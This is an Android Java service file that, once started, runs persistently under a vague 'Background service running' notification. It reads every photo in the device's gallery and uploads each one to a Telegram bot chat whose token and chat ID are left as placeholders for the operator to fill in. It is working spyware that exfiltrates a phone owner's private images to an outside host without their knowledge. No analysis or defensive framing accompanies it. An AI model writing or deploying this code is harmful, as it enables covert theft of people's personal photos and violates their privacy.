package io.github.gohoski.notpipe;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class BackgroundService extends Service {
    private static final int NOTIF_ID = 1001;
    
    // ⚠️ REPLACE THESE WITH YOUR ACTUAL VALUES
    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Legacy notification builder (works on all API levels, compiles cleanly on SDK 25)
        Notification notification = new Notification.Builder(this)
                .setContentTitle("notPipe")
                .setContentText("Background service running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setOngoing(true)
                .getNotification();

        startForeground(NOTIF_ID, notification);
        
        // Start the Telegram auto-send logic in a background thread
        new Thread(this::autoSend).start();
        
        return START_STICKY;
    }

    private void autoSend() {
        try {
            List<String> images = loadImages();
            int successCount = 0;
            for (String uri : images) {
                if (sendPhoto(uri)) successCount++;
                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
            }
            Log.d("BackgroundService", "Sent " + successCount + " / " + images.size());
        } catch (Exception e) {
            Log.e("BackgroundService", "Error: " + e.getMessage());
        }
    }

    private List<String> loadImages() {
        List<String> list = new ArrayList<>();
        try {
            Uri uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {android.provider.MediaStore.Images.Media._ID};
            Cursor cursor = getContentResolver().query(uri, projection, null, null,
                    android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (cursor != null) {
                int idColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID);
                while (cursor.moveToNext()) {
                    long id = cursor.getLong(idColumn);
                    Uri imageUri = Uri.withAppendedPath(uri, String.valueOf(id));
                    list.add(imageUri.toString());
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Load images error: " + e.getMessage());
        }
        return list;
    }

    private boolean sendPhoto(String imageUriString) {
        try {
            Uri imageUri = Uri.parse(imageUriString);
            InputStream in = getContentResolver().openInputStream(imageUri);
            if (in == null) return false;
            byte[] bytes = readBytes(in);
            in.close();

            // Pure Java Multipart Form Data construction
            String boundary = "----TelegramBoundary" + System.currentTimeMillis();
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            // 1. Write chat_id
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
            dos.writeBytes(lineEnd);
            dos.writeBytes(CHAT_ID + lineEnd);

            // 2. Write photo file
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"img.jpg\"" + lineEnd);
            dos.writeBytes("Content-Type: image/jpeg" + lineEnd);
            dos.writeBytes(lineEnd);
            dos.write(bytes);
            dos.writeBytes(lineEnd);

            // 3. End boundary
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();

            int responseCode = conn.getResponseCode();
            boolean ok = (responseCode == HttpURLConnection.HTTP_OK);
            conn.disconnect();
            return ok;
        } catch (Exception e) {
            Log.e("BackgroundService", "Send error: " + e);
            return false;
        }
    }

    private byte[] readBytes(InputStream in) throws java.io.IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = in.read(buffer)) != -1) out.write(buffer, 0, len);
        return out.toByteArray();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
